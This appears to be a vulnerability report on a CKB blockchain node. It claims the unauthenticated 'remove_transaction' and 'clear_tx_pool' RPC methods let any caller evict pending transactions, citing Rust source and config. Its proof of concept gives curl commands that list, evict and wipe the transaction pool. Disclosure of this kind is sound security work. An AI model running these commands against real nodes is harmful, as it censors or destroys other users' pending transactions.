### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPC Methods Allow Any Caller to Evict Arbitrary Users' Pending Transactions — (`rpc/src/module/pool.rs`)

---

### Summary

The `Pool` RPC module exposes `remove_transaction` and `clear_tx_pool` as fully unauthenticated methods with no caller identity check and no ownership verification. Any caller who can reach the RPC endpoint can silently evict any pending transaction — or the entire mempool — submitted by any other user. This is a direct structural analog to the `collectRentUser` vulnerability: a state-modifying function that is callable by anyone with attacker-controlled parameters and no access guard.

---

### Finding Description

In `rpc/src/module/pool.rs`, the `PoolRpc` trait exposes two destructive methods with zero authentication:

```rust
#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;

#[rpc(name = "clear_tx_pool")]
fn clear_tx_pool(&self) -> Result<()>;
```

Their implementations perform no caller verification whatsoever:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| { ... })
}

fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot).map_err(|err| ...)?;
    Ok(())
}
```

`remove_transaction` calls down to `TxPool::remove_tx`, which calls `pool_map.remove_entry_and_descendants` — removing the target transaction **and all its descendants** in one call. There is no check that the caller submitted the transaction, no API key, no IP allowlist enforced at the method level, and no rate limit.

The `Pool` module is enabled by default in `ckb.toml`:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

The RPC binds to `127.0.0.1:8114` by default, but:
1. Any local process on the same host (including malicious scripts, compromised co-located services, or other users on a shared server) can reach it.
2. Operators routinely expose the RPC to wider networks for remote management, monitoring dashboards, or cloud deployments — the config only warns, it does not enforce.
3. There is no authentication layer at all, so exposure is binary: reachable = full control.

A third method, `clear_tx_verify_queue`, similarly clears the verification queue with no authentication.

---

### Impact Explanation

**Targeted transaction censorship:** An attacker who can observe the mempool (via `get_raw_tx_pool`, also unauthenticated) can identify a victim's `tx_hash` and call `remove_transaction(tx_hash)`. The victim's transaction — and every descendant — is silently dropped. The victim receives no notification.

**Time-sensitive transaction loss:** CKB transactions can carry `since` locks (block-number or timestamp relative/absolute). A DAO withdrawal, a time-locked payment, or a transaction that must be confirmed within a specific proposal window can be permanently invalidated if it is evicted at the right moment and the window closes before resubmission. The attacker does not need to replace the transaction; simply removing it at the critical block is sufficient.

**Full pool wipe:** `clear_tx_pool()` removes every pending, proposed, and gap transaction in a single unauthenticated call. On a node serving multiple users or acting as a relay, this is a complete mempool reset affecting all in-flight transactions simultaneously.

---

### Likelihood Explanation

- **Shared-host scenario (high likelihood):** Any process running on the same machine as the CKB node can call `127.0.0.1:8114` without any credential. This includes web servers, indexers, monitoring agents, or other user accounts on a multi-tenant host.
- **Exposed RPC scenario (medium likelihood):** Operators who expose the RPC for remote management (common in cloud/container deployments) make these methods reachable from the network. The config warns but does not prevent this.
- **No skill barrier:** The attack is a single HTTP POST with a known tx hash. The tx hash is publicly observable from `get_raw_tx_pool` or network relay traffic.

---

### Recommendation

1. **Add an ownership/submitter check to `remove_transaction`:** Record which peer or local caller submitted each transaction (the `TxEntry` already stores a `peer` field in the orphan pool). Reject removal requests that do not originate from the submitter or a designated admin identity.

2. **Gate destructive methods behind a separate privileged module or require an explicit admin token:** `clear_tx_pool` and `clear_tx_verify_queue` should not be in the same unauthenticated `Pool` module as `send_transaction`. Move them to a `Debug` or `Admin` module that is disabled by default, analogous to how the fix in the original report added `onlyOrderbook`.

3. **Minimum viable fix (analogous to the confirmed fix in the report):** Add a caller-origin check — at minimum, verify the request originates from the loopback interface at the HTTP layer and reject it otherwise, so that even if the port is accidentally exposed, remote callers cannot invoke these methods.

---

### Proof of Concept

**Prerequisites:** The attacker can reach `127.0.0.1:8114` (local process) or the operator has exposed the RPC port.

**Step 1 — Discover victim's pending transaction:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns all pending tx hashes — no authentication required
```

**Step 2 — Remove the victim's transaction (and all descendants):**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"remove_transaction","params":["0x<victim_tx_hash>"]}'
# Returns: {"result": true}  — transaction silently evicted, no auth check performed
```

**Step 3 (escalation) — Wipe the entire pool:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"result": null}  — all users' transactions removed
```

**Expected outcome:** The victim's transaction is gone from the pool. If the transaction had a time-sensitive `since` constraint or was near the end of its proposal window, it may not be re-confirmable. The attacker performed this with no credentials, no privileged key, and no on-chain action.

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** tx-pool/src/pool.rs (L271-288)
```rust
    pub(crate) fn remove_expired(&mut self, callbacks: &Callbacks) {
        let now_ms = ckb_systemtime::unix_time_as_millis();

        let removed: Vec<_> = self
            .pool_map
            .iter()
            .filter(|&entry| self.expiry + entry.inner.timestamp < now_ms)
            .map(|entry| entry.inner.clone())
            .collect();

        for entry in removed {
            let tx_hash = entry.transaction().hash();
            debug!("remove_expired {} timestamp({})", tx_hash, entry.timestamp);
            self.pool_map.remove_entry(&entry.proposal_short_id());
            let reject = Reject::Expiry(entry.timestamp);
            callbacks.call_reject(self, &entry, reject);
        }
    }
```

**File:** tx-pool/src/pool.rs (L358-361)
```rust
    pub(crate) fn remove_tx(&mut self, id: &ProposalShortId) -> bool {
        let entries = self.pool_map.remove_entry_and_descendants(id);
        !entries.is_empty()
    }
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** util/app-config/src/configs/rpc.rs (L79-81)
```rust
    /// Checks whether the Pool module is enabled.
    pub fn pool_enable(&self) -> bool {
        self.modules.contains(&Module::Pool)
```
